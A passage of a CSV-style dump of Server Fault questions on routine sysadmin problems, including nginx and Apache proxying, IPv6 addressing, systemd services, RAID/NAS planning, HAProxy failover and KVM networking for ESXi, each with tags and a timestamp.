","<domain-name-system><domain><godaddy><name>","2019-03-29 00:09:49"
"1026763","Is using easy passwords on root account safe?","<p>Now that I've got your attention :)</p>
<p>This is more of a thought experiment than a real question</p>
<p>I've been thinking about using an easy root account password for recovery purposes, having in mind these restrictions for login:</p>
<ul>
<li>SSH Password Authentication is off for all users</li>
<li>Only Public Key Authentication is allowed for all users</li>
<li>Users are not allowed to &quot;su root&quot; with root password by using eg. pam_wheel.so to prevent unauthorized users that are not in sudoers.d from becoming root</li>
<li>Only way to log in as root is via KVM / Local login</li>
</ul>
","<linux><security><pam>","2020-07-26 09:49:52"
"1026781","Do I need php-mysql? If I already have nginx, php-fpm and mariadb-server?","<p>Do I need to install it if I already have nginx, php-fpm and mariadb-server?
What is php-mysql for?</p>
","<debian>","2020-07-26 14:15:28"
"960581","Access local server via WAN FQDN and Draytek router/firewall","<p>I'm experiencing problems accessing a local server in my LAN via it's internet address. Let me explain.<br>
I have a local server, on IP 192.168.1.15, and it's serving http (port 80) (All my computers/servers in my LAN having addresses in the  192.168.1.0/24 range).
When I access this server from a computer in the LAN via <a href=""http://192.168.1.15:80"" rel=""nofollow noreferrer"">http://192.168.1.15:80</a>, everything works.<br>
This server is accessible from the internet via NAT (e.g. <a href=""http://my.server.com:8888"" rel=""nofollow noreferrer"">http://my.server.com:8888</a>). This is working as well, no problem there.
However, when I try to access this server from my LAN via this address (<a href=""http://my.server.com:8888"" rel=""nofollow noreferrer"">http://my.server.com:8888</a>), I'm unable to access it.<br>
When I check the firewall log, it's giving this entry:</p>

<pre><code>[FILTER][Block][LAN/RT/VPN-&gt;WAN, 1:23:18 ][@S:R=13:1, 82.84.24.33:58741-&gt;192.168.1.15:80][TCP][HLen=20, TLen=52, Flag=S, Seq=1765099532, Ack=0, Win=64240]
</code></pre>

<p>Where 82.84.24.33 is my fixed WAN IP. And this is making no sense for me:</p>

<pre><code>LAN/RT/VPN-&gt;WAN / 82.84.24.33:58741-&gt;192.168.1.15:80  
</code></pre>

<p>It looks like the firewall thinks that the 82.84.24.33 is LAN and 192.168.1.15 is WAN....<br>
And another strange thing, there are rules in the firewall to allow traffic LAN->WAN for port 80 (http)... Even in the other direction as well (WAN->LAN).<br>
Only when I set the default rule in the firewall to 'allow' in stead of 'block' it's working, but that's obviously no option.<br>
Thanks!</p>
","<firewall><nat><draytek>","2019-03-29 07:53:46"
"908006","nginx rewrite domain/service to domain","<p>I have a domain <strong><a href=""http://test.test"" rel=""nofollow noreferrer"">http://test.test</a></strong> . I need nginx rewrite rule that states: if you write <em><a href=""http://test.test/whatever/whatever"" rel=""nofollow noreferrer"">http://test.test/whatever/whatever</a></em> to go to <strong><a href=""http://test.test"" rel=""nofollow noreferrer"">http://test.test</a></strong>.</p>
","<nginx><rewrite>","2018-04-17 08:27:36"
"960643","Apache Reverse Proxy redirect with assets folder in another path","<p>I'm using Apache2 to perform Reverse Proxy for my tomcat.</p>

<p>my domain name is <a href=""https://dev.domain.com"" rel=""nofollow noreferrer"">https://dev.domain.com</a> to be redirected to <a href=""http://127.0.0.1:8080/MyApp"" rel=""nofollow noreferrer"">http://127.0.0.1:8080/MyApp</a></p>

<p>proxy is ok but tomcat is having an asset folder located in the root folder (<a href=""http://127.0.0.1:8080/assets"" rel=""nofollow noreferrer"">http://127.0.0.1:8080/assets</a>)</p>

<p>while loading my dev.domain.com page I have a 404 Error for every assets elements to be displayed.
Here is my VirtualHost configuration:</p>

<pre><code>&lt;VirtualHost *:443&gt;

    ServerAdmin webmaster@localhost

    proxyRequests Off
    SSLProxyEngine on

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    ServerName dev.domain.com

    ProxyPass / http://127.0.0.1:8080/MyApp/
    ProxyPassReverse / http://127.0.0.1:8080/MyApp/

    SSLCertificateFile ....

&lt;/VirtualHost&gt;
</code></pre>

<p>it seems that everything which is not in the MyApp folder is not correctly redirected, do you know I can do that ?</p>
","<reverse-proxy><apache2>","2019-03-29 15:07:02"
"1026870","Adding public ipv6 addresses to a server","<p>I just ordered a VPS with an IPv6 subnet routed to it so I can test a software that is supposed to work on IPv6.</p>
<p>This is my first encounter with IPv6 and I'm curious to know how to add them into the <code>/etc/network/interfaces</code> file for example. I know how to add IPv4 but I'm having a difficult time here because the subnet that was allocated to me (<code>2a0e:f500:2::/48</code>), once converted, shows <code>1,208,925,819,614,629,174,706,176</code> usable addresses. I don't think I'm supposed to add all those addresses in my interfaces - maybe smaller subnets.</p>
<p>I have a bit of software written in Golang by me that generates addresses and here's what I got out from this subnet:</p>
<pre><code>2a0e:f500:2::1
2a0e:f500:2::2
2a0e:f500:2::3
2a0e:f500:2::4
2a0e:f500:2::5
2a0e:f500:2::6
2a0e:f500:2::7
2a0e:f500:2::8
2a0e:f500:2::9
2a0e:f500:2::a
2a0e:f500:2::b
2a0e:f500:2::c
2a0e:f500:2::d
2a0e:f500:2::e
2a0e:f500:2::f
2a0e:f500:2::10
2a0e:f500:2::11
2a0e:f500:2::12
2a0e:f500:2::13
2a0e:f500:2::14
2a0e:f500:2::15
2a0e:f500:2::16
2a0e:f500:2::17
2a0e:f500:2::18
2a0e:f500:2::19
2a0e:f500:2::1a
2a0e:f500:2::1b
2a0e:f500:2::1c
2a0e:f500:2::1d
2a0e:f500:2::1e
2a0e:f500:2::1f
2a0e:f500:2::20
2a0e:f500:2::21
2a0e:f500:2::22
2a0e:f500:2::23
2a0e:f500:2::24
2a0e:f500:2::25
2a0e:f500:2::26
2a0e:f500:2::27
2a0e:f500:2::28
2a0e:f500:2::29
2a0e:f500:2::2a
2a0e:f500:2::2b
2a0e:f500:2::2c
2a0e:f500:2::2d
2a0e:f500:2::2e
2a0e:f500:2::2f
2a0e:f500:2::30
2a0e:f500:2::31
2a0e:f500:2::32
2a0e:f500:2::33
2a0e:f500:2::34
2a0e:f500:2::35
2a0e:f500:2::36
2a0e:f500:2::37
2a0e:f500:2::38
2a0e:f500:2::39
2a0e:f500:2::3a
2a0e:f500:2::3b
2a0e:f500:2::3c
2a0e:f500:2::3d
2a0e:f500:2::3e
2a0e:f500:2::3f
2a0e:f500:2::40
2a0e:f500:2::41
2a0e:f500:2::42
2a0e:f500:2::43
2a0e:f500:2::44
2a0e:f500:2::45
2a0e:f500:2::46
2a0e:f500:2::47
2a0e:f500:2::48
2a0e:f500:2::49
2a0e:f500:2::4a
2a0e:f500:2::4b
2a0e:f500:2::4c
2a0e:f500:2::4d
2a0e:f500:2::4e
2a0e:f500:2::4f
2a0e:f500:2::50
2a0e:f500:2::51
2a0e:f500:2::52
2a0e:f500:2::53
2a0e:f500:2::54
2a0e:f500:2::55
2a0e:f500:2::56
2a0e:f500:2::57
2a0e:f500:2::58
2a0e:f500:2::59
2a0e:f500:2::5a
2a0e:f500:2::5b
2a0e:f500:2::5c
2a0e:f500:2::5d
2a0e:f500:2::5e
2a0e:f500:2::5f
2a0e:f500:2::60
2a0e:f500:2::61
2a0e:f500:2::62
2a0e:f500:2::63
2a0e:f500:2::64
</code></pre>
<p>I see 100 entries here. Am I supposed to add these to my interfaces file or what?</p>
","<ipv6>","2020-07-27 09:21:51"
"908071","RHEL 7 service kicks in immediately","<p>I am migrating an application from RHEL 6 to 7. In RHEL 6, I used chkconfig and in 7 I am attempting to use systemctl ( config shown below).
However, I noticed that if I stop the service using the actual command (instead of using systemctl stop ), the service gets started up automatically. I dont want this to happen. How do I disable this ?</p>

<pre>
[Unit]
Description=My service

[Service]
User=my_account
Group=my_account
Type=simple
WorkingDirectory=/some_location
ExecStart=/some_location/start_my_service.sh
ExecStop=/some_location/stop_my_service.sh

[Install]
WantedBy=multi-user.target

</pre>
","<linux><redhat>","2018-04-17 16:26:32"
"960677","aws instance is not accessing through public IP","<p>i installed nginx server in ubuntu instance. then i copy my data into /var/www/html folder. then i access site through public ip. its working fine. Then i create A record with public ip address. so i can access with domain name. 
After few hours i am not accessing the site.
I checked in server nginx service is running. but i can't access the website.
ports are open in security group for that instances.
curl localhost
curl privateip
curl publicdns are working. but curl  with public ip is not working. could you please help me this issue.</p>
","<amazon-web-services>","2019-03-29 18:11:43"
"908147","Does Dynamic DNS update accept only few record types?","<p>I have looked on google, but still unclear about this question. Does dynamic DNS on linux only accept few record types or all records such as SOA, A, PTR, MX?</p>
","<domain-name-system>","2018-04-18 00:13:12"
"1027000","Debian/Ubuntu, inconsistency between S-ATA ports numbering and /dev/sdX lettering","<p>The hardware situation is as such :</p>
<ul>
<li>a motherboard (MSI X99A SLI Plus),</li>
<li>two (2) Samsung 860 Pro SSDs connected on SATA-1 and SATA-2 of the motherboard.</li>
<li>five (5) identical HDDs connected on SATA-3, SATA-4, SATA-5, SATA-6, SATA-7</li>
</ul>
<p>The BIOS correctly sees two SSDs on the two first SATA port, and all following HDD on following port.</p>
<p><strong>Issue</strong> :
Debian, Ubuntu, and Proxmox see one of the HDDs first as <code>sda</code>, then the two SSDs <code>sdb</code> and <code>sdc</code>, and then the HDDs again as <code>sdd</code>, <code>sde</code>, <code>sdf</code>, <code>sdg</code></p>
<p><strong>Expected</strong> :
The SSD connected to SATA-1 and SATA-2 as <code>sda</code> and <code>sdb</code>. Then all the HDDs on the following letters.</p>
<p>I would like to get the expected behavior, for ease of understanding/maintenance.</p>
<p><a href=""https://i.sstatic.net/pxq5v.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/pxq5v.jpg"" alt=""What the bios sees"" /></a></p>
<p><a href=""https://i.sstatic.net/d99oD.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/d99oD.jpg"" alt=""What a debian based OS sees"" /></a></p>
","<diskmanagement><udev><drive><dev>","2020-07-28 07:56:17"
"836958","adding new partitions to a device the containing root partition","<p>On virtual box, I have my root file system mounted on the LVM:</p>

<pre><code># df -h | head -n 2 | tail -n 1
/dev/mapper/cl-root  1.5G  951M  404M  71% /
</code></pre>

<p>The LVM is mounted on <code>/dev/sda2</code>, and <code>/dev/sda</code> has the following table:</p>

<pre><code># parted /dev/sda print | grep MB
Disk /dev/sda: 8590MB
1    1049kB   1075MB   1074MB    primary   ext4    boot
2    1075MB   3511MB   2436MB    primary           lvm
</code></pre>

<p>I want to add swap space and a new logical volume 700MB in size - what's best practice for doing this given the above?</p>

<p>I've tried adding a new LVM partition, <code>/dev/sda3</code>, but after a reboot I just got a black screen.</p>
","<centos7><lvm><partition><swap><rootfs>","2017-03-08 09:20:31"
"908187","moving from shared hosting to amazon","<p>I have several websites  - all PHP based (some WP and some native) on a shared hosting service.<br>
It's great - simple control panel (cPanel) for DB and other fast maintenance needs. however, the service's up-time is.. well.. you got the idea.</p>

<p>I want to move it to amazon but it seems like a monster, huge list of options, endless terms which i am not familiar with.</p>

<p>I need a simple ""the steps (and terms) are"" walk-through and tips. </p>

<p>Note: I'm not asking how to use the system, i will google it myself. i want to understand the concept. </p>
","<amazon-ec2><amazon-web-services><migration><shared-hosting>","2018-04-18 08:09:04"
"837017","vps web hosting performance?","<p>I'm confused about a </p>

<pre><code>1 vCore
2,4 GHz
2 Go RAM
SSD 10 Go
Local Raid 10
</code></pre>

<p>vps capabilities!! Can i use this vps for hosting 4 websites with no problem. To be more specific one of the websites will have at least 1000 visit per day.
Thank you.</p>
","<ubuntu><vps><web-hosting>","2017-03-08 14:34:20"
"837020","Windows Server 2016 Essentials vs Standard feature list?","<p>Is there a straightforward comparison of Windows Server 2016 Essentials vs Standard Edition? Most pages that claim to compare actually only show the features of Standard vs DataCentre, including the main Microsoft page here <a href=""https://www.microsoft.com/en-us/cloud-platform/windows-server-pricing"" rel=""nofollow noreferrer"">https://www.microsoft.com/en-us/cloud-platform/windows-server-pricing</a></p>

<p>I understand the basic differences in licensing costs, but am more concerned with missing features such as Remote Desktop Services and Hyper-V.</p>

<p>I will be using it for a small office of less than 5 people and devices as a basic domain server as well as for SQL Server and occasionally virtual machines.</p>
","<windows-server-2016>","2017-03-08 14:53:13"
"1027079","How to serve non-root static files by nginx?","<p>I tried:</p>
<pre><code>user nginx;
...
...
       location / {
           root /home/tango/www/html;
       }

</code></pre>
<p>Only to get 403 forbidden error. The <code>/home/tango/www/html/index.html</code> is generated by <code>tango</code> so I don't think I can put that in <code>/var/www/html/</code> writing where requires root permission.</p>
<p>The error log confirms the permission error:</p>
<pre><code>2020/07/28 11:50:12 [error] 122769#0: *533 open() &quot;/home/tango/www/html/index.html&quot; failed (13: Permission denied), client: XXX.YYY.ZZZ.AAA, server: , request: &quot;GET /diagcte HTTP/1.1&quot;, host: &quot;my.org&quot;
</code></pre>
<p>However, <code>ls -la /home/tango/www/html/index.html</code> shows:</p>
<p><code>-rw-r--r--. 1 tango posixusers 212 Jul 28 11:33 /home/tb571/www/html/index.html</code></p>
<p>So the <code>nginx</code> user should have read permission.</p>
<p>Anyways, can you help with serving a non-root static file through <code>nginx</code>?</p>
","<nginx>","2020-07-28 16:00:05"
"1027087","Rsync on synology error","<p>I have created an SSH key shared between my Synology NAS and the Debian cloud server. I created this script to synchronize two folders, but it doesn't seem to work.</p>
<p><strong>Command:</strong></p>
<p><code>rsync -av --delete -e &quot;ssh -i /home/root/.ssh/id_rsa -p 22&quot; /var/www/vhosts/mysite.com/httpdocs/ rsync@domain.synology.me::NetBackup/ </code></p>
<p><strong>Error:</strong></p>
<p><code>rsync: change_dir &quot;/var/www/vhosts/mysite.com/httpdocs/ rsync@domain.synology.me::/NetBackup&quot; failed: No such file or directory (2)</code></p>
","<linux><rsync><synology>","2020-07-28 16:35:28"
"1027091","Why is my client still talking to my server when I change client IP to different subnet?","<p>On occasion, I'm using a Verizon Mifi adapter to share an internet connection over my office network (which doesn't have internet).</p>
<p>To do this, I have to share the internet connection on the adaptor, which changes my local ip address to a different subnet, along with anyone utilizing the shared resource, in essence disconnecting anyone using the internet from the office network.</p>
<p>So, the office network operates on subnet 192.168.2.0</p>
<p>After sharing, the client now has an ip on subnet 192.168.137.0</p>
<p>This obviously disables us from talking to the office network after joining the internet connection.</p>
<p>Or so I thought. One of my co-workers pointed out that he can still connect to our server using the UNC,</p>
<pre><code>\\servername\sharename
</code></pre>
<p>He cannont ping the server with the server ip. However, when he pings the server with its friendly name, it is able to ping and replies with the MAC address (using ARP cache I'm assuming). So instead of resolving the name to the IP, it's resolving to the MAC address.</p>
<p>However, from what I've read <a href=""https://serverfault.com/questions/397350/what-happens-when-arp-request-comes-from-a-different-subnet"">here</a>, he still shouldn't be able to connect to the server.</p>
<p>Any helpful explanation would be much appreciated.</p>
","<networking><ip><ethernet><arp>","2020-07-28 16:57:21"
"837072","How difference between use name-based virtual hosts or host headers?","<p>I start my own server to host web sites, and on this beggin i came across this question:</p>

<p>How difference between use name-based virtual hosts or host headers?</p>
","<web-server><web-hosting>","2017-03-08 18:42:17"
"1027117","How do I paste a list of files to a command?","<p>Let's say I have a newline-separated list of file paths from a previous command that I can copy to clipboard. What's the easiest way to paste this list to feed it into another command in a shell? Preferably, so that I can still edit the list before executing the command. E.g., I want to <code>rm</code> some subset of the untracked files returned by <code>git status</code>.</p>
","<linux><bash><shell><mac>","2020-07-28 21:15:18"
"837095","How do I monitor system parameters like memory, CPU and disks on windows systems via SNMP?","<p>I want to monitor system parameters like CPU load, CPU Idle time on windows system via SNMP. Does HOST-RESOURCES-MIB can handle this?</p>
","<snmp><cpu-usage>","2017-03-08 19:46:39"
"908360","appending to a filename w/ a date from within a cron job","<p>I have read that we can determine the current date in Bash with the date command like follows:</p>

<pre><code>NOW=$(date +""%Y-%m-%d"")
</code></pre>

<p>In my crontab I append logs to files, and wanted to use this to put dates at the end of my file names, like follows:</p>

<pre><code>cd /x/y/z/ &amp;&amp; mycommand &amp;&gt;&gt; /x/y/z/logs/mylog_$(date '+%Y%m%d').txt
</code></pre>

<p>However, this doesn't work as expected. I get the below error message, which I don't understand... I have no idea what it's referring to. I'm pretty new to using cron jobs.</p>

<pre><code>/bin/sh: -c: line 0: unexpected EOF while looking for matching `''
/bin/sh: -c: line 1: syntax error: unexpected end of file
</code></pre>
","<bash><cron>","2018-04-18 20:34:32"
"1027202","How to forward proxy via nginx with TLS?","<p>Is it possible to forward a SOAP call to a server through nginx and encrypt it via TLS while doing so?</p>
<p>A SOAP service is sending data to a target location (unencrypted) and I would like to send the data to a running nginx server (to a specified port), which encrypts and forwards it to a specified server/port.</p>
","<nginx><ssl><proxy>","2020-07-29 15:34:05"
"837184","Forward only BIND server","<p>I have a unique situation where I provide hosting service with subdomain.mycompany.com to my users. The subdomain can be hosted on any of my geographically distributed servers which has their own name servers configured. </p>

<p>To correctly resolve IP addresses I have created a ""forward"" only name server which basically acts as a gateway to all other name servers. Makes sense?</p>

<p>Here is my config</p>

<pre><code>options {
    allow-query { any; };
    dnssec-enable yes;
    dnssec-validation yes;

    auth-nxdomain no;    
    listen-on-v6 { any; };
    recursion yes;
    forwarders {
            nameserver-loc1.ip;
            nameserver-loc2.ip;
            nameserver-loc3.ip;
            nameserver-loc4.ip;
    };

    forward only;
}
</code></pre>

<p>My question is - Am I in the right direction (as I am new to BIND server) and how can I secure this configuration to increase security posture.</p>
","<domain-name-system><bind>","2017-03-09 06:38:49"
"1027301","Comparing two Linux servers for any differences","<p>I tried to find a similar post, but couldn't. Apologies if this is a duplicate.</p>
<p>We have a number of RHEL6 servers hosting different applications. Over time, these servers have had some tweaks to system parameters such as tcp_fin_timeout, /etc/security/limits.conf etc. to improve application performance and fix issues.</p>
<p>We need to upgrade these servers to RHEL7. As previous changes weren't logged anywhere and have long been forgotten about, is there a script/tool that can list out all system parameters and their values so servers can be compared and make sure we don't miss anything?</p>
","<linux><redhat><audit>","2020-07-30 09:47:11"
"1028390","Application stop/start during EC2 autoparking","<p>I need to autopark EC2 instance on weekends, this requires stopping application during shutdown and starting the same on EC2 startup on Monday. How do I and where should I put the stop/start application scripts in Linux (RHEL).</p>
","<linux><amazon-ec2><redhat>","2020-07-31 01:51:02"
"1028401","how to publish .net core 3.1 application in window server 2008","<p>I have a DotnetCore 3.1 based website which I have to publish on the Windows 2008 server standard with the IIS 7.0 configuration.</p>
<p>how can I publish the DotnetCore based website in IIS 7.0? Do I need to upgrade my IIS from 7.0 to another? I have already installed a 3.1 hosting bundle. OS is x64 based.</p>
","<iis>","2020-07-31 06:08:51"
"1028447","Why is the Linux kernel such an important/popular thing? Are there must-know things about it for day-to-day work?","<p>DISCLAIMER: I have been a Windows guy for as long as I can remember, but I now slowly moving to Linux, Docker and Kubernetes (oh, boy!).</p>
<p>On Windows I developed and administered commercial applications and seen large-scale solutions. I have never explicitly gone out of the OS <a href=""https://en.wikipedia.org/wiki/User_space"" rel=""nofollow noreferrer"">user mode/space</a> and into anything from the <a href=""https://en.wikipedia.org/wiki/Protection_ring#SUPERVISOR-MODE"" rel=""nofollow noreferrer"">kernel mode</a>.</p>
<p>Can someone explain why is there so much talk and development surrounding Linux kernels?
Are there any basic things that I need to be aware of when I am developing and deploying applicaitons on Linux distributions?</p>
<p>For example: I participate in the development and deployment of Java, nodeJS and Python modules and the deployment of relevant middleware such as Redis, PostgreSQL and nginx.</p>
","<linux-kernel>","2020-07-31 13:36:20"
"1028448","Building a NAS, Raid vs HBA?","<p>Building a NAS with the hardware below. I've been reading through the IXSystems forums as i'm thinking about using FreeNAS or Unraid for the OS. I see that ZFS requires HBA cards rather than raid cards and i have both. I'm trying to see what is the best possible implementation i can get with the hardware specified for hosting IIS directory data.</p>
<p>I have a virtualized environment and i'd like to offload the IIS root files from the host machine onto the NAS. I'm mainly running .net applications and would like to centralize the root files so that i can build redundancy using ARR and NLB where two instances of IIS point to the NAS for the files and use a cache provider.</p>
<p>Hardware:
Supermicro 4U 24 Bay X10QBi 4x E7-4820 V2 2Ghz 32-Cores 128GB 4x PSU</p>
<p>2x LSI 9361-8i Raid Card 12g (Raid cards if i go Raid6 or Raid10)</p>
<p>2x LSI 9300-8i HBA Card 12g (HBA Cards if i go the ZFS Route)</p>
<p>10x 4TB WD Red HDD's</p>
<p>8x 2TB WD Red SDD's</p>
<p>I was hoping to setup Hot and Cold tiered storage so on-demand files to be hosted on the faster SSD's and the less used files on cold in the HDD's</p>
<p>From my research it seems FreeNas dosen't offer that as a native feature so i was hoping for some guidance for this implementation</p>
<p><a href=""https://www.ixsystems.com/community/threads/setting-up-hot-and-cold-tiers-using-ssd-and-hdd.86387/#post-598737"" rel=""nofollow noreferrer"">https://www.ixsystems.com/community/threads/setting-up-hot-and-cold-tiers-using-ssd-and-hdd.86387/#post-598737</a></p>
","<raid><zfs><network-attached-storage><truenas>","2020-07-31 13:46:26"
"837337","How to setup local website with a certain domain","<p>In a old PC, I installed <code>Ubuntu server 14.04</code> and I want to use this server to host some websites and web applications that will be available in my network. I installed <code>Apache</code> and when I click in the browser the IP of my server I successfully see the Apache's webpage.</p>

<p>Lets say, I have a static website which is accessible from <code>192.168.0.10/mysite.html</code>. Is it possible to access this site from a certain domain (e.g. mydomain.mycompany.gr) which will work only under my network?</p>

<p>I tried and I create a virtual host, using this <a href=""https://www.digitalocean.com/community/tutorials/how-to-set-up-apache-virtual-hosts-on-ubuntu-14-04-lts"" rel=""noreferrer"">guide</a> but it didn't worked..</p>
","<apache-2.2><ubuntu-14.04>","2017-03-09 19:39:05"
"1028478","Error installing Proftp Debian 9","<p>I always install Proftp on Centos and it works well.
I am now installing on Debian 9 and there is an error in the configuration file.
Installation is no problem.</p>
<p>And the configuration file is what the installation creates, I do not change anything in the file and this error already exists.</p>
<pre><code>root@altais:~# systemctl status proftpd
● proftpd.service - LSB: Starts ProFTPD daemon
   Loaded: loaded (/etc/init.d/proftpd; generated; vendor preset: enabled)
   Active: failed (Result: exit-code) since Fri 2020-07-31 16:45:57 -03; 3s ago
     Docs: man:systemd-sysv-generator(8)
  Process: 45717 ExecStart=/etc/init.d/proftpd start (code=exited, status=1/FAILURE)

Jul 31 16:45:57 altais systemd[1]: Starting LSB: Starts ProFTPD daemon...
Jul 31 16:45:57 altais proftpd[45717]: Starting ftp server: proftpd2020-07-31 16:45:57,902 altais proftpd[45724]: warning: unable to determine IP address of 'altais'
Jul 31 16:45:57 altais proftpd[45717]: 2020-07-31 16:45:57,902 altais proftpd[45724]: error: no valid servers configured
Jul 31 16:45:57 altais proftpd[45717]: 2020-07-31 16:45:57,902 altais proftpd[45724]: fatal: error processing configuration file '/etc/proftpd/proftpd.conf'
Jul 31 16:45:57 altais proftpd[45717]:  failed!
Jul 31 16:45:57 altais systemd[1]: proftpd.service: Control process exited, code=exited status=1
Jul 31 16:45:57 altais systemd[1]: Failed to start LSB: Starts ProFTPD daemon.
Jul 31 16:45:57 altais systemd[1]: proftpd.service: Unit entered failed state.
Jul 31 16:45:57 altais systemd[1]: proftpd.service: Failed with result 'exit-code'.
root@altais:~#

</code></pre>
<p>Has anyone been there and can you help me?</p>
","<linux><debian>","2020-07-31 19:54:07"
"837359","HAProxy: Prevent 503 errors on failover","<p>I'm trying to setup HAProxy as an highly available reverse proxy. We're running it on a cluster of 3 nodes, where all nodes are identical. When a service is down on one of the node, any of the other nodes can handle the http request.</p>

<p>Therefore, I'm trying to setup HAProxy as such:</p>

<pre><code>frontend main
    bind *:80
    default_backend back

backend back
    server node01 localhost:8080 check fall 1 rise 1
    server node02 node02:80 backup
    server node03 node03:80 backup
</code></pre>

<p>This works, however, there's a window where HAProxy will return a <code>503 Service Unavailable</code> when <code>service</code> is down and HAProxy is in the process of doing the failover towards <code>node02</code>.</p>

<p>Is there any way to setup HAProxy to detect that the request sent to service will not be handled, and to forward it to <code>node02</code> without any interruption of service?</p>

<p>TLDR: Is there any way to setup HAProxy for transparent failover to backup servers?</p>
","<centos6><haproxy>","2017-03-09 21:30:56"
"837398","Outgoing network bandwidth is high even for empty response","<p>I have a simple nginx server that monitors the requests and store them in the access logs. The requests contain data in query parameters and are about 500 bytes. My output is just a HTTP 204 response. But, when I monitor the network bandwidth, I am seeing the incoming rate as 8.44 Mbit/s and outgoing rate as 5.19 MBit/s.</p>

<p>Question is, why is the outgoing rate high?</p>

<p>The output from ""tcpflow -p -C -i eth0 port 80"" is below.</p>

<pre><code>GET ############## HTTP/1.1
Host: ##############
Accept: */*
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Forwarded: for=""[############]""
Origin: ###########
Referer: #########
Save-Data: on
Scheme: http
Via: 1.1 Chrome-Compression-Proxy
X-Forwarded-For: #################
Connection: Keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-J710FN Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36


write error to stdout

HTTP/1.1 204 No Content
Server: nginx/1.4.6 (Ubuntu)
Date: Fri, 10 Mar 2017 04:54:43 GMT
Connection: keep-alive
Access-Control-Allow-Origin: *
Content-Type: text/plain
</code></pre>
","<ubuntu><networking><nginx><performance>","2017-03-10 06:21:34"
"1028584","Why would I configure the /etc/networks file?","<p>I'm playing with a FreeBSD VM. I'm more accustomed to Linux, which doesn't need /etc/networks as far as I'm aware.</p>
<p><a href=""https://people.freebsd.org/%7Enik/nag/book.html#x-087-2-iface.simple-resolv"" rel=""nofollow noreferrer"">Nik Clayton's FreeBSD Network Administrators Guide</a> says this about the /etc/networks file:</p>
<p>&quot;Just as with a host's IP address, you should sometimes use a symbolic name for network numbers, too. Therefore, the hosts file has a companion called /etc/networks that maps network names to network numbers, and vice versa.&quot;</p>
<p>It goes on to give an example of use, but it doesn't explain when or why the /etc/networks file would ever be used.</p>
<p>I notice &quot;man 5 networks&quot; at the <a href=""https://www.freebsd.org/cgi/man.cgi?query=networks&amp;sektion=5"" rel=""nofollow noreferrer"">FreeBSD website</a> mentions DARPA, which suggests it's a very old file format. The <a href=""https://man7.org/linux/man-pages/man5/networks.5.html"" rel=""nofollow noreferrer"">Linux edition</a> mentions netstat and route, which are still used on FreeBSD. This suggests there might be some sort of dynamic routing use for /etc/networks the same way we use /etc/hosts in combination with DNS?</p>
<p>Is there a purpose to /etc/networks? Or is it just a legacy artifact of old FreeBSD versions that hasn't been removed yet?</p>
","<networking><freebsd>","2020-08-02 13:59:39"
"1028614","Best Practices - RAID on local backup repository?","<p>What is the best practice when it comes to using RAID on a NAS, when that NAS is purely there to hold server backups?</p>
<p>My intuition tells me to forego RAID and just use a single drive.  Reasons why:</p>
<ul>
<li>Cheaper on Hardware</li>
<li>Better performance</li>
<li>Simpler.  One less level of complexity = fewer things to go wrong / fewer things to monitor</li>
<li>Longer Drive Life (no raid integrity checks, synchronizations, and no heat from a second drive)</li>
<li>Any benefits of going RAID would be negated by a 2-drive failure anyhow.</li>
</ul>
<p>Here's the reasons against that I can think of ...</p>
<ul>
<li>local and offsite backups would be interrupted - everything since last backup would not be backed up.</li>
<li>would need to recreate the storage pools and volumes, and reconfigure the backup software so it could sync with the offsite.  Potential problems / complexity with that.</li>
<li>Labour is the most expensive component ...</li>
</ul>
<p>Specifics of implementation:
Server 2019 - Drives are protected with RAID
Replicating from Server to NAS
NAS will be replicating to Backblaze B2
6TB Ironwolf Pro Drives in the NAS ...</p>
<p>If software like Veeam was involved - I'd definitely go RAID because you don't want to interrupt the synthetic fulls / replication chains ..  but this is a smaller office .. so I'm left weighing it out.</p>
<p>What's the best practice for these scenarios?   Do you really need redundancy on your redundancy?</p>
","<backup><raid><network-attached-storage><qnap>","2020-08-02 22:57:19"
"908761","BIND with Dynamic DNS","<p>I'm using a DDNS service provider for my domain. Because my server is behind a router that changes IP.<br>
I have just figure out that I can have a dns server (like BIND) inside my local server and, from what I read, (I need to have wildcard dns) I just have to submit this BIND NS record to the domain registar.<br>
I would like to know if submiting my NS to the domain registar would work, even if my dns server (BIND for example) is behind a router that changes ip address from time to time.</p>
","<domain-name-system><dynamic-dns>","2018-04-20 17:34:17"
"837485","IP Alias/Virtual Interface for ESXi on KVM/libvirt","<p>I need to run two ESXi hosts on KVM and assign them distinct, external IPs visible to the external network. Desired topology:</p>

<pre><code>  ESXI     ESXI
   ↓        ↓       
  KVM      KVM
   ↓        ↓
  vIF      vIF
(own ip)  (own ip)
   ↓        ↓
 Physical NIC 
      ↓
 External Net
</code></pre>

<p>It's a cinch with other hosts as two bridged Virtual Interfaces with vNIC model set to Virtio device would do the trick. But Virtio as NIC model is not supported by ESXi and it won't boot complaining about no network adapter detected.</p>

<p>Is there a way to make Virtual Interfaces work with ESXi on KVM? I tried to go along with E1000 as NIC but couldn't connect ESXi to external network.</p>

<p>Here's the config I tried. <strong>None</strong> worked:</p>

<pre><code>&lt;interface type='bridged'&gt;
  &lt;source bridge='br0'/&gt;
  &lt;model type='virtio'/&gt;  #ESXi won't boot due to no adapter detected
&lt;/interface&gt;

&lt;interface type='bridged'&gt;
  &lt;source source='br0'  /&gt;
  &lt;model type='e1000'/&gt;  #ESXi boots but no network connectivity
&lt;/interface&gt;

&lt;interface type='direct'&gt;
  &lt;source dev='br0' mode='bridged' /&gt;
  &lt;model type='e1000'/&gt; #ESXi boots but no network connectivity
&lt;/interface&gt;

&lt;interface type='direct'&gt;
  &lt;source dev='br0' mode='passthrough' /&gt;
  &lt;model type='e1000'/&gt;  #ESXi boots but no network connectivity
&lt;/interface&gt;

#Not applicable to my requirements as physical NIC would be passed to KVM
&lt;interface type='direct'&gt;
  &lt;source dev='enp2s0:0' mode='passthrough' /&gt;
  &lt;model type='e1000'/&gt;  
&lt;/interface&gt;

&lt;interface type='direct'&gt;
  &lt;source dev='br0' mode='bridged' /&gt;
  &lt;model type='e1000'/&gt;  #ESXi boots but no network connectivity
&lt;/interface&gt;
</code></pre>

<p>Here's my interfaces:</p>

